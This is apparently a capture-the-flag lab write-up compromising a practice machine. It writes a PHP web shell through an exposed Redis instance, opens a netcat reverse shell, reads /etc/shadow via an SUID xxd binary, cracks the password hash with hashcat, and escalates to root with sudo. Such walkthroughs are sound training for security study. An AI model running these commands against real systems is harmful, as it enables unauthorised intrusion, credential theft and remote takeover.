
# Scanning and Enumeration

Doing an nmap scan:

```bash
nmap -p- -A -T4 10.10.127.152
```

Output:  

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7

Linux 3.10 - 3.13 (95%)
```

#### Port 80
Nothing much

#### Port 6379
We find **Redis**

##### What is Redis?

Based on this resources:  

[redis intro](https://redis.io/topics/introduction)  
[redis documentation](https://redis.io/documentation)

Redis is an open source (BSD licensed), in-memory data structure store,
used as a database, cache and message broker.
It supports data structures such as strings, hashes, lists, sets,
sorted sets with range queries, bitmaps, hyperloglogs,
geospatial indexes with radius queries and streams.
Redis has built-in replication, Lua scripting, LRU eviction,
transactions and different levels of on-disk persistence,
and provides high availability via Redis Sentinel and
automatic partitioning with Redis Cluster.  

If we look in the nmap scan we can see that the version of Redis running
is **6.0.7**

# Exploitation

After a google search redis 6.0.7 doesn't seem to be vulnerable  
Let's try and study more about how Redis works  
Let's try and connect to the database

```bash
redis-cli -h 10.10.144.11 -p 6379
```

I searched in google how to get a shell in redis and the best write-up
I found was by [HackTricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce)

According to it, we must first know the path of the web site folder.
But since we know that the webserver is Apache,
we assume that the path is /var/www/html

```bash
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save
```

Navigate to the Apache2 server  
You can get a reverse shell by:

```bash
http://10.10.144.11/shell.php?cmd=nc -e /bin/sh <you-ip> <port>
```

# Post Exploitation

We can upload linpeas to the machine but with a quick search for
SUID bit set binaries

```bash
find / -perm -u=s 2>/dev/null
```

I found **/usr/bin/xxd** which is weird

# Privilege Escalation

Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/)

```bash
LFILE=/etc/shadow
/usr/bin/xxd "$LFILE" | /usr/bin/xxd -r
```

Output:

```bash
$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

Let's crack it with hashcat

```bash
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

Output:

```bash
beautiful1
```

Import a tty so we can su to vianka

```bash
python -c "import pty; pty.spawn('/bin/sh')"
```

To get root

```bash
sudo -l
sudo su
cat /root/root.txt
```
